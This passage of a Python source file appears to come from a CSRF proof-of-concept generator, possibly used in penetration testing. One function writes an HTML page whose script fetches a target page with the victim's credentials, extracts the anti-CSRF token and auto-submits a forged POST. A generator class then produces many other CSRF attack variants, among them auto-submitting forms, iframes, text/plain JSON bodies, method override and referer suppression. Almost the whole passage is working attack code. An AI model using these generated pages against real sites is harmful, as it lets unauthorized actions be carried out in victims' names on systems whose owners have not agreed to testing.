# ----------------------------------------------------------------
# P11: Token steal + auto-submit (same-origin only)
# ----------------------------------------------------------------
def gen_token_steal(action: str, token_page_url: str, token_name: str, params: dict) -> str:
    other_params = {k: v for k, v in params.items() if k != token_name}
    extra_fields = "&".join(f"{k}={v}" for k, v in other_params.items())
    html = f"""<html>
{ATTRIBUTION}
<head><title>CSRF Token Steal PoC</title></head>
<body>
  <script>
    function submitWithToken(token) {{
      var xhr = new XMLHttpRequest();
      xhr.withCredentials = true;
      xhr.open("POST", "{action}", true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.send("{token_name}=" + encodeURIComponent(token) + "&{extra_fields}");
    }}

    var xhr = new XMLHttpRequest();
    xhr.responseType = "document";
    xhr.withCredentials = true;
    xhr.open("GET", "{token_page_url}", true);
    xhr.onload = function() {{
      if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {{
        var page = xhr.response;
        var match = page.querySelector('input[name="{token_name}"]');
        if (match) {{
          submitWithToken(match.value);
        }}
      }}
    }};
    xhr.send(null);
  </script>
</body>
</html>"""
    return _save_poc(f"{_sanitize_filename(action)}-token-steal.html", html)


# ----------------------------------------------------------------
# Public API
# ----------------------------------------------------------------
class PoCGenerator:
    def __init__(self, output_dir: str = ""):
        if output_dir:
            global OUTPUT_DIR
            OUTPUT_DIR = output_dir

    def generate(self, vuln_type: str, action: str, method: str,
                 params: dict, **kwargs) -> str:
        """Generate a specific PoC type. Returns file path."""
        generators = {
            "get-img": gen_get_img,
            "get-link": gen_get_link,
            "post-auto": gen_post_autosubmit,
            "post-iframe": gen_post_iframe,
            "post-xhr": gen_post_xhr,
            "json-textplain": gen_json_textplain,
            "json-xhr": gen_json_xhr,
            "multipart-fetch": gen_multipart_fetch,
            "method-override": gen_method_override,
            "referer-suppressed": gen_referer_suppressed,
        }

        gen_fn = generators.get(vuln_type)
        if gen_fn:
            return gen_fn(action, params, **kwargs)

        logger.warning("Unknown PoC type: %s", vuln_type)
        return ""

    def generate_all_variants(self, action: str, method: str, params: dict) -> list[str]:
        """Generate all applicable PoC variants for a given endpoint."""
        paths = []

        if method.upper() == "GET":
            paths.append(gen_get_img(action, params))
            paths.append(gen_get_link(action, params))
        else:
            paths.append(gen_post_autosubmit(action, params))
            paths.append(gen_post_iframe(action, params))
            paths.append(gen_post_xhr(action, params))
            paths.append(gen_json_textplain(action, params))
            paths.append(gen_json_xhr(action, params))
            paths.append(gen_multipart_fetch(action, params))
            paths.append(gen_method_override(action, params))
            paths.append(gen_referer_suppressed(action, params))

        logger.info("Generated %d PoC variants for %s", len(paths), action)
        return paths
